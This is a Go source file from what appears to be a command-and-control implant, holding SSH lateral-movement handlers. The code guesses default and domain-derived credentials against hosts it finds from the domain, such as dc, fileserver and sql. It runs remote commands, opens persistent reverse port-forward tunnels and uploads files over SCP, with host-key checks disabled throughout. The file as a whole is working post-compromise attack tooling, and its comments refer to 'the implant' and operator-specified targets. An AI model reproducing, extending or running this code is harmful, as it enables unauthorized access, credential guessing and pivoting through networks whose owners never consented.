//go:build linux || windows || darwin

package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// SSH connection result
type SSHResult struct {
	Host       string `json:"host"`
	Port       int    `json:"port"`
	User       string `json:"user"`
	AuthMethod string `json:"auth_method"`
	Success    bool   `json:"success"`
	Output     string `json:"output,omitempty"`
	Error      string `json:"error,omitempty"`
}

// Credential types for SSH authentication
type SSHCredential struct {
	User     string `json:"user"`
	Password string `json:"password,omitempty"`
	KeyPath  string `json:"key_path,omitempty"`
	KeyData  string `json:"key_data,omitempty"`
	Domain   string `json:"domain,omitempty"`
}

func handleSSHLateralImpl(task Task, res *TaskResult) {
	// Parse task parameters: host, port, user, auth_type, command
	params := parseSSHParams(task.Command)

	var results []SSHResult

	// Credential acquisition: try multiple credentials
	creds := gatherSSHCredentials(params)

	hosts := resolveSSHTargets(params)
	port := params.port
	if port == 0 {
		port = 22
	}
	command := params.command
	if command == "" {
		command = "whoami"
	}

	for _, host := range hosts {
		for _, cred := range creds {
			result := trySSHConnect(host, port, cred, command)
			results = append(results, result)
			if result.Success {
				break // Don't try other creds if one worked
			}
		}
	}

	// Format output
	var sb strings.Builder
	for _, r := range results {
		status := "❌"
		if r.Success {
			status = "✅"
		}
		sb.WriteString(fmt.Sprintf("%s %s@%s:%d [%s]\n", status, r.User, r.Host, r.Port, r.AuthMethod))
		if r.Output != "" {
			sb.WriteString(r.Output)
			if !strings.HasSuffix(r.Output, "\n") {
				sb.WriteString("\n")
			}
		}
		if r.Error != "" {
			sb.WriteString(fmt.Sprintf("  Error: %s\n", r.Error))
		}
	}
	res.Output = sb.String()
}

type sshParams struct {
	hosts   []string
	port    int
	user    string
	command string
	keyFile string
}

func parseSSHParams(input string) sshParams {
	params := sshParams{
		port:    22,
		command: "whoami",
	}

	// Format: "host1,host2;user:password@host3:port;command=whoami"
	// Or JSON-like: {"hosts":["host1"],"port":22,"user":"admin","command":"whoami","key":"path/to/key"}

	parts := strings.SplitN(input, ";", 3)
	for _, part := range parts {
		if strings.HasPrefix(part, "command=") {
			params.command = strings.TrimPrefix(part, "command=")
		} else if strings.HasPrefix(part, "key=") {
			params.keyFile = strings.TrimPrefix(part, "key=")
		} else if strings.HasPrefix(part, "user=") {
			params.user = strings.TrimPrefix(part, "user=")
		} else if strings.HasPrefix(part, "port=") {
			// Best-effort parse; failure keeps the configured default port.
			_, _ = fmt.Sscanf(part, "port=%d", &params.port)
		} else if strings.HasPrefix(part, "hosts=") {
			params.hosts = strings.Split(strings.TrimPrefix(part, "hosts="), ",")
		} else if strings.Contains(part, "@") {
			// user@host format
			atIdx := strings.LastIndex(part, "@")
			params.user = part[:atIdx]
			rest := part[atIdx+1:]
			if colonIdx := strings.Index(rest, ":"); colonIdx >= 0 {
				params.hosts = append(params.hosts, rest[:colonIdx])
				_, _ = fmt.Sscanf(rest[colonIdx+1:], "%d", &params.port)
			} else {
				params.hosts = append(params.hosts, rest)
			}
		} else {
			// Plain host
			params.hosts = append(params.hosts, part)
		}
	}

	return params
}

func gatherSSHCredentials(params sshParams) []SSHCredential {
	var creds []SSHCredential

	// Try provided user/password
	if params.user != "" {
		creds = append(creds, SSHCredential{User: params.user, Password: ""})
	}

	// Try key-based auth
	if params.keyFile != "" {
		creds = append(creds, SSHCredential{User: params.user, KeyPath: params.keyFile})
	}

	// Try domain cached creds
	domain := os.Getenv("USERDOMAIN")
	username := os.Getenv("USERNAME")
	if domain != "" && username != "" {
		creds = append(creds, SSHCredential{User: domain + "\\" + username})
	}

	// Try common default creds
	defaultCreds := []SSHCredential{
		{User: "root", Password: ""},
		{User: "admin", Password: ""},
		{User: "Administrator", Password: ""},
	}
	creds = append(creds, defaultCreds...)

	return creds
}

func resolveSSHTargets(params sshParams) []string {
	if len(params.hosts) > 0 {
		return params.hosts
	}
	// Try to resolver from domain/subnet if available
	if domain := os.Getenv("USERDNSDOMAIN"); domain != "" {
		// Attempt DNS resolution
		hosts := tryResolveDomainHosts(domain)
		if len(hosts) > 0 {
			return hosts
		}
	}
	return []string{"127.0.0.1"}
}

func tryResolveDomainHosts(domain string) []string {
	var hosts []string
	commonHosts := []string{
		"dc", "dns", "fileserver", "srv", "mail", "sql",
	}
	for _, h := range commonHosts {
		host := h + "." + domain
		if _, err := net.LookupHost(host); err == nil {
			hosts = append(hosts, host)
		}
	}
	// Try to enumerate via LDAP (reuse existing functions)
	// This is a simplified version
	return hosts
}

func trySSHConnect(host string, port int, cred SSHCredential, command string) SSHResult {
	result := SSHResult{
		Host:       host,
		Port:       port,
		User:       cred.User,
		AuthMethod: "password",
	}

	addr := fmt.Sprintf("%s:%d", host, port)
	config := &ssh.ClientConfig{
		User: cred.User,
		// #nosec G106 -- the agent has no known_hosts store; lateral targets are operator-specified.
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // #nosec G106
		Timeout:         10 * time.Second,
	}

	// Try key-based auth first if available
	if cred.KeyPath != "" || cred.KeyData != "" {
		result.AuthMethod = "key"
		var keyData []byte
		var err error

		if cred.KeyPath != "" {
			keyData, err = os.ReadFile(cred.KeyPath)
			if err != nil {
				result.Error = fmt.Sprintf("key read error: %v", err)
				return result
			}
		} else {
			keyData = []byte(cred.KeyData)
		}

		var signer ssh.Signer
		signer, err = ssh.ParsePrivateKey(keyData)
		if err != nil {
			// Try with passphrase (empty)
			signer, err = ssh.ParsePrivateKeyWithPassphrase(keyData, []byte(""))
			if err != nil {
				result.Error = fmt.Sprintf("key parse error: %v", err)
				return result
			}
		}
		config.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	} else if cred.Password != "" {
		result.AuthMethod = "password"
		config.Auth = []ssh.AuthMethod{ssh.Password(cred.Password)}
	} else {
		// Try agent/SSO
		config.Auth = []ssh.AuthMethod{ssh.Password("")}
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		result.Error = fmt.Sprintf("dial error: %v", err)
		return result
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		result.Error = fmt.Sprintf("session error: %v", err)
		return result
	}
	defer session.Close()

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	session.Stdout = &stdout
	session.Stderr = &stderr

	if err := session.Run(command); err != nil {
		result.Output = stdout.String()
		result.Error = fmt.Sprintf("command error: %v | stderr: %s", err, stderr.String())
		return result
	}

	result.Success = true
	result.Output = stdout.String()

	return result
}

// SSH credential probe for lateral movement
func handleSSHKeygenImpl(task Task, res *TaskResult) {
	params := strings.SplitN(task.Command, " ", 2)
	if len(params) < 1 {
		res.Error = "usage: ssh_keygen <host> [user]"
		return
	}

	host := params[0]
	user := "root"
	if len(params) > 1 {
		user = params[1]
	}

	result := trySSHConnect(host, 22, SSHCredential{User: user}, "id")
	res.Output = fmt.Sprintf("SSH key scan result for %s@%s:\nSuccess: %t\n%s", user, host, result.Success, result.Output)
	if !result.Success {
		res.Error = result.Error
	}
}

// handleSSHTunnelImpl drives the remote port forward task.
// Format: "host:remote_port:local_port [user]"
func handleSSHTunnelImpl(task Task, res *TaskResult) {
	parts := strings.Fields(task.Command)
	if len(parts) < 1 {
		res.Error = "usage: ssh_tunnel host:remote_port:local_port [user]"
		return
	}

	target := parts[0]
	user := "root"
	password := strings.TrimSpace(task.Shell)
	if len(parts) > 1 {
		user = parts[1]
	}
	if len(parts) > 2 && password == "" {
		password = parts[2]
	}

	colonParts := strings.Split(target, ":")
	if len(colonParts) != 3 {
		res.Error = "invalid target format: host:remote_port:local_port"
		return
	}

	msg, err := startSSHTunnel(colonParts[0], colonParts[1], colonParts[2], user, password, task.Path)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = msg
}

// ── SSH remote port forward ───────────────────────────────────────────────────
// `ssh_tunnel host:remote_port:local_port [user]` opens an SSH connection to
// the target and forwards the target's remote_port (listening on the SSH
// server) to 127.0.0.1:local_port on this agent. The tunnel is managed in a
// registry so it stays alive after the task handler returns — it is torn down
// only when the SSH connection itself dies.

var (
	sshTunMu   sync.Mutex
	sshTunnels = map[string]*sshTunnel{}
)

type sshTunnel struct {
	host       string
	remotePort string
	localPort  string
	user       string
	client     *ssh.Client
	listener   net.Listener
	closed     bool
}

func (t *sshTunnel) key() string { return net.JoinHostPort(t.host, t.remotePort) }

// startSSHTunnel dials the target and registers a live remote port forward.
// Returns an honest status message once the listener is actually bound.
func startSSHTunnel(host, remotePort, localPort, user, password, keyPEM string) (string, error) {
	if _, err := strconv.Atoi(remotePort); err != nil {
		return "", fmt.Errorf("invalid remote_port %q", remotePort)
	}
	if _, err := strconv.Atoi(localPort); err != nil {
		return "", fmt.Errorf("invalid local_port %q", localPort)
	}

	key := net.JoinHostPort(host, remotePort)
	sshTunMu.Lock()
	if t, ok := sshTunnels[key]; ok && !t.closed {
		sshTunMu.Unlock()
		return "", fmt.Errorf("ssh tunnel already active on %s", key)
	}
	sshTunMu.Unlock()

	addr := net.JoinHostPort(host, "22")
	var auth []ssh.AuthMethod
	if keyPEM != "" {
		signer, err := ssh.ParsePrivateKey([]byte(keyPEM))
		if err != nil {
			if data, rerr := os.ReadFile(keyPEM); rerr == nil {
				signer, err = ssh.ParsePrivateKey(data)
			}
		}
		if err != nil {
			return "", fmt.Errorf("ssh private key: %w", err)
		}
		auth = append(auth, ssh.PublicKeys(signer))
	}
	if password != "" {
		auth = append(auth, ssh.Password(password))
	}
	if len(auth) == 0 {
		return "", fmt.Errorf("ssh_tunnel requires a password (command extra arg or task shell) or a private key (task path)")
	}
	config := &ssh.ClientConfig{
		User: user,
		// #nosec G106 -- lab default; pin host keys in production via ssh_lateral.
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // #nosec G106
		Timeout:         10 * time.Second,
		Auth:            auth,
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return "", fmt.Errorf("SSH dial error: %v", err)
	}
	listener, err := client.Listen("tcp", net.JoinHostPort("127.0.0.1", remotePort))
	if err != nil {
		client.Close()
		return "", fmt.Errorf("SSH listen error: %v", err)
	}

	t := &sshTunnel{
		host:       host,
		remotePort: remotePort,
		localPort:  localPort,
		user:       user,
		client:     client,
		listener:   listener,
	}
	sshTunMu.Lock()
	if prev, ok := sshTunnels[key]; ok && !prev.closed {
		sshTunMu.Unlock()
		listener.Close()
		client.Close()
		return "", fmt.Errorf("ssh tunnel already active on %s", key)
	}
	sshTunnels[key] = t
	sshTunMu.Unlock()

	go t.acceptLoop()

	return fmt.Sprintf("SSH tunnel active: %s:%s → 127.0.0.1:%s (via %s@%s)", host, remotePort, localPort, user, host), nil
}

func (t *sshTunnel) acceptLoop() {
	for {
		conn, err := t.listener.Accept()
		if err != nil {
			t.teardown()
			return
		}
		go t.bridge(conn)
	}
}

// bridge pipes one forwarded connection to the agent-side local service and
// back, both directions.
func (t *sshTunnel) bridge(in net.Conn) {
	defer in.Close()
	out, err := net.DialTimeout("tcp", net.JoinHostPort("127.0.0.1", t.localPort), 5*time.Second)
	if err != nil {
		return
	}
	defer out.Close()
	done := make(chan struct{}, 2)
	copyDir := func(dst, src net.Conn) {
		_, _ = io.Copy(dst, src)
		done <- struct{}{}
	}
	go copyDir(in, out)
	go copyDir(out, in)
	<-done
}

// teardown unregisters the tunnel and closes its SSH client and listener.
func (t *sshTunnel) teardown() {
	sshTunMu.Lock()
	if !t.closed {
		t.closed = true
		delete(sshTunnels, t.key())
	}
	sshTunMu.Unlock()
	_ = t.listener.Close()
	t.client.Close()
}

// SSH file upload via SCP
func handleSCPUploadImpl(task Task, res *TaskResult) {
	// Format: "host:user:password:local_path:remote_path"
	parts := strings.SplitN(task.Command, ":", 5)
	if len(parts) < 5 {
		res.Error = "usage: scp_upload host:user:password:local_path:remote_path"
		return
	}

	host := parts[0]
	user := parts[1]
	password := parts[2]
	localPath := parts[3]
	remotePath := parts[4]

	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		res.Error = fmt.Sprintf("local file read error: %v", err)
		return
	}

	addr := fmt.Sprintf("%s:22", host)
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(password)},
		// #nosec G106 -- same lateral rationale: no known_hosts on the implant.
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // #nosec G106
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		res.Error = fmt.Sprintf("SSH dial error: %v", err)
		return
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		res.Error = fmt.Sprintf("SSH session error: %v", err)
		return
	}
	defer session.Close()

	go func() {
		w, _ := session.StdinPipe()
		defer w.Close()
		fileName := filepath.Base(remotePath)
		fmt.Fprintf(w, "C0644 %d %s\n", len(data), fileName)
		// Stream write failures surface through session.Wait's exit status below.
		_, _ = w.Write(data)
		fmt.Fprintf(w, "\x00")
	}()

	if err := session.Run(fmt.Sprintf("scp -t %s", remotePath)); err != nil {
		res.Error = fmt.Sprintf("SCP error: %v", err)
		return
	}

	res.Output = fmt.Sprintf("Uploaded %s (%d bytes) to %s@%s:%s", localPath, len(data), user, host, remotePath)
}
